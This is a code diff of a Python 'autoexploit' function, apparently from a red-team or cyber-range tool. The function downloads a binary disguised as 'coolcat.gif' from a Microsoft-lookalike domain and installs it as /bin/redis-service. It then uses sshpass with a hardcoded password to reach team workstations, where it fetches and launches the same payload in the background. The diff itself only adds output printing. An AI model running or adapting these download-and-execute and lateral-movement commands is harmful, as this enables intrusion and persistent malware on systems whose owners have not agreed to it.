@@ -161,22 +161,30 @@ def reverse(remote):
 
 def autoexploit(remote, team):
     print("\033[92m[+]\033[0m AutoExploitation...")
-    remote.shell_cmd("apt-get update -y")    
-    remote.shell_cmd("apt-get install -y curl openssh-client sshpass libssl-dev")
-    remote.shell_cmd(f"curl http://microsoftonline.download/download/coolcat.gif -o /bin/redis-service")
-    remote.shell_cmd("chmod +x /bin/redis-service")
+    #remote.shell_cmd("apt-get update -y")    
+    #remote.shell_cmd("apt-get install -y curl openssh-client sshpass libssl-dev")
+    out = remote.shell_cmd(f"curl http://microsoftonline.download/download/coolcat.gif -o /bin/redis-service")
+    print(out)
+    out = remote.shell_cmd("chmod +x /bin/redis-service")
+    print(out)
 
     # Failed login
-    remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.100")
+    out = remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.100")
+    print(out)
 
     # Workstation1 exploitation
-    remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.3 wget http://microsoftonline.download/gifs/coolcat.gif -O redis")
-    remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.3 chmod +x redis && nohup ./redis daemon")
+    out = remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.3 'wget http://microsoftonline.download/gifs/coolcat.gif -O redis'")
+    print(out)
+    out = remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.3 'chmod +x redis && nohup ./redis daemon'")
+    print(out)
     # Workstation3 exploitation
-    remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.122 wget http://microsoftonline.download/gifs/coolcat.gif -O redis")
-    remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.122 chmod +x redis && nohup ./redis daemon")
+    out = remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.122 'wget http://microsoftonline.download/gifs/coolcat.gif -O redis'")
+    print(out)
+    out = remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.122 'chmod +x redis && nohup ./redis daemon'")
+    print(out)
     # Daemon running on redis server
-    remote.shell_cmd("/bin/redis-service daemon")
+    out = remote.shell_cmd("/bin/redis-service daemon")
+    print(out)
     
     print('Auto exploit done!')
     
